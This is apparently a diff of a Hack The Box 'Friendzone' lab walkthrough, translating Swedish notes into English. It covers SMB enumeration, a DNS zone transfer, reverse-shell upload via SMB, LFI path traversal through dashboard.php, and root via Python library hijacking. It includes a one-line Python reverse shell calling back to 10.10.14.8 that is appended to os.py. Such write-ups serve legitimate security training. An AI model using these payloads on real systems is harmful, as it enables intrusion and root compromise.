@@ -1,94 +1,116 @@
 ---
 layout: single
 title: Friendzone - Hack The Box
-excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
+excerpt: "N/A"
 date: 2019-06-17
 classes: wide
 header:
   teaser: /assets/images/htb-writeup-friendzone/friendzone_logo.png
   teaser_home_page: true
   icon: /assets/images/linux.png
+  unreleased: false
 categories:
   - hackthebox
-  - infosec
 tags:  
   - linux
-  - mysql
-  - mattermost
-  - hashcat
-  - rules
+  - easy
+  - smb
+  - zone transfer
+  - lfi
+  - pspy64
+  - file permissions
 ---
 
-![](/assets/images/htb-writeup-friendzone/friendzone_logo.png)
+![](/assets/images/htb-writeup-friendzone/friendzone_logo.png){: style="float: right; width: 200px; margin-left: 2em"}
 
-"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
+N/A<br><br><br><br><br><br><br>
 
 ----------------
 
 
-### USER ###
+# USER
+## Enumeration
 
-1. Enum standard + extra smb
-   nmap -sC -sV -O 10.10.10.123
-   nmap --script=smb-enum-shares 10.10.10.123 (visar shares, rättigheter samt path)
+Enum standard + extra smb
+```bash
+nmap -sC -sV -O 10.10.10.123
+nmap --script=smb-enum-shares 10.10.10.123 
+```
 
-2. Ladda hem cred.txt
-   smbclient //10.10.10.123/general
-   get creds.txt
+Grab `cred.txt`
+```bash
+smbclient //10.10.10.123/general
+get creds.txt
+```
 
-3. Zone Transfer för att få fram subdomäner
-   dig axfr friendzone.red @10.10.10.123
+Zone Transfer to find subdomains
+```bash
+dig axfr friendzone.red @10.10.10.123
+```
 
-4. Lägg in alla subdomäner i /etc/hosts
-   10.10.10.123 friendzone.red
-   10.10.10.123 administrator1.friendzone.red
-   10.10.10.123 hr.friendzone.red
-   10.10.10.123 uploads.friendzone.red
+Add subdomains to `/etc/hosts`
+```bash
+10.10.10.123 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red
+```
 
-5. Logga in på administrator1 med creds från steg 2
+Login as `administrator1` with credentials found from `cred.txt`
 
-6. Ladda upp reverse shell i SMB map med write-rättigheter (Development)
-   smbclient //10.10.10.123/Development
-   put r
+Upload reverse shell through SMB
+```bash
+smbclient //10.10.10.123/Development
+put r
+```
 
-7. Slå igång nc för att ta emot reverse
-   nc -lnvp 4455
+Prepare `nc` to grab reverse shell
+```bash
+nc -lnvp 4455
+```
 
-8. LFI via dashboard.php för att anropa reverse shell
-   Från smb-enum-shares i steg 1 fick vi fram path till Development (/etc/Development), anropa reverse shell:
-   dashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/r
+Use LFI through dashboard.php to trigger reverse shell.<br>
+With previous enumeration of smb shares we found the path to `/etc/Development` where our shell will be uploaded.
 
-   NOTE1:
-   Kan vara värt att ladda upp en test fil innehållande "<?php phpinfo(); ?>" (utan "") för att hitta path till filerna
+`dashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/r`
 
-   NOTE2:
-   Anropet kommer se ut såhär: <?php “include/”.include($_GET['pagename'].“.php”); ?>
-   Döp INTE din fil till .php då anropet blir ($_GET['../../../../etc/development/x.PHP'].“.php”); ?> och kommer inte lira
-   (dubbel .php-filändelse)
+> **NOTE1:**<br>
+> Probably smart to upload a test file, like `<?php phpinfo(); ?>`, before going for the reverse shell.
 
-9. Plocka user via /home/friend/user.txt
 
-10. Hämta SSH-creds
-    ls /var/www/htm/mysql_data.conf
-    (f*****:A*************)
+> **NOTE2:**<br>
+> The php call will look something like this: `<?php “include/”.include($_GET['pagename'].“.php”); ?>`<br>
+> Do not end your filename with `.php` as this is already done in the code and you'll create a double file ending. 
 
-### ROOT ###
+Grab user: `/home/friend/user.txt`
 
-1. SSH in till boxen
-   ssh friend@10.10.10.123
+Grab SSH-creds:
+```bash
+ls /var/www/htm/mysql_data.conf
+(f*****:A*************)
+```
 
-2. Kolla på tjänster som körs med pspy
-   2019/06/18 16:24:01 CMD: UID=0    PID=4059   | /bin/sh -c /opt/server_admin/reporter.py 
-   2019/06/18 16:24:01 CMD: UID=0    PID=4058   | /bin/sh -c /opt/server_admin/reporter.py 
-   2019/06/18 16:24:01 CMD: UID=0    PID=4057   | /usr/sbin/CRON -f 
+---------
+<br><br>
 
-3. Undersök scriptet reporter.py och se att 'import os' används
+# ROOT
 
-4. Import os körs via /usr/lib/python2.7/os.py vilket har +r+w rättigheter (skulle se detta via lse med -l1 flaggan)
-   Hittade denna info via kommandot: python -c 'import sys; print "\n".join(sys.path)'
-   Samt läste om det på: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
+```bash
+ssh friend@10.10.10.123
+```
 
-5. Editera os.py och lägg till one-line python reverse shell längst ner, och vänta på att cron triggar det
+Look on executing services with `pspy64`:
+```bash
+2019/06/18 16:24:01 CMD: UID=0    PID=4059   | /bin/sh -c /opt/server_admin/reporter.py 
+2019/06/18 16:24:01 CMD: UID=0    PID=4058   | /bin/sh -c /opt/server_admin/reporter.py 
+2019/06/18 16:24:01 CMD: UID=0    PID=4057   | /usr/sbin/CRON -f 
+```
+
+Investigate the script `reporter.py` and we find that it uses `import os`.
+
+
+With ls -l1 we find that we have `+r+w` one the file `/usr/lib/python2.7/os.py`
+
+Add a python reverse shell at the end of `os.py` and wait for cron to trigger it.
+```bash
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
 
-6. Starta nc -lvnp 4488 och plocka root.txt
+Start `nc -lvnp 4488` and grab `root.txt`
